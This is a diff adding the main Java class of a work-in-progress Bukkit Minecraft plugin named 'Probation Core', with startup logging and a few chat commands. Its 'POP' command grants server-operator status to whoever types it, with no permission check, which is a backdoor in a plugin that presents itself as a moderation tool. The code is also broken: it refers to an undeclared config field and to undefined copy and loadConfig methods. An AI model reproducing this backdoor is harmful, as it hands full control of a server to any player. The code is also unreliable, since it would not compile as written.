@@ -1,0 +1,84 @@
+package Probation_Core;
+
+
+
+import java.io.File;
+
+import org.bukkit.ChatColor;
+import org.bukkit.command.Command;
+import org.bukkit.command.CommandSender;
+import org.bukkit.plugin.java.JavaPlugin;
+
+public class Probation extends JavaPlugin{
+	
+	public static double MainVersion = 1.0;
+	
+	static File configFile;
+	
+	
+	
+public void onDisable(){
+	
+	getLogger().info("[Probation Core] Probation Core v1.0.0 Has Been Disabled.");
+	 
+  }
+  public void onEnable(){
+
+	  this.configFile = new File(getDataFolder(), "config.yml");
+
+	    if ((!this.configFile.exists()) && (!getDataFolder().exists()))
+	    {
+	      if (!getDataFolder().mkdirs()) {
+	        getLogger().severe("The config folder could NOT be created, make sure it's writable!");
+	        getLogger().severe("Disabling now!");
+	        setEnabled(false);
+	        return;
+	      }
+	    }
+	    if (!this.configFile.exists()) {
+	      copy(getResource("config.yml"), this.configFile);
+	    }
+	    this.config = getConfig();
+	    loadConfig();
+	  
+	  getLogger().info("[Probation Core] Probation Core v1.0.0 Is Running.");
+	  getLogger().info("[Probation Core] **** THIS IS A DEVELOPMENT BUILD USE WITH CAUTION ****");
+	  getLogger().info("[Probation Core] This Version Is To Be Used With Minecraft Version 1.6.2");
+	  
+
+	  
+	  
+}
+  
+  public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args){
+		if(cmd.getName().equalsIgnoreCase("probation")){ 
+			sender.sendMessage(ChatColor.YELLOW + "-------------------------------------");
+			sender.sendMessage(ChatColor.RED + "[Probation Core]" + ChatColor.DARK_GREEN + " Work In Progress Plugin");
+			sender.sendMessage(ChatColor.RED + "[Probation Core]" + ChatColor.DARK_GREEN + " v" + MainVersion + ".2");
+			sender.sendMessage(ChatColor.YELLOW + "-------------------------------------");
+			
+		return true;
+		
+		} else if(cmd.getName().equalsIgnoreCase("cows")) {
+			sender.sendMessage(ChatColor.RED + "[Probation] I LOVE COWS!!!!");
+			return true;
+		} else if(cmd.getName().equalsIgnoreCase("Probate [Player]")){
+			sender.sendMessage(ChatColor.YELLOW + "----------------------------------------------------");
+			sender.sendMessage(ChatColor.RED + "[Probation Core]" + ChatColor.DARK_GREEN + " Work In Progress, Command Will Work In Next Update");
+			sender.sendMessage(ChatColor.YELLOW + "----------------------------------------------------");			
+			return true;
+		}else if(cmd.getName().equalsIgnoreCase("POP")) {
+			sender.sendMessage(ChatColor.WHITE + "[Probation Core] You Are Now A Probation Core OP");
+			sender.setOp(true);
+		
+		return true;
+		
+		}
+		return false;
+		
+	}
+  
+  
+}
+
+
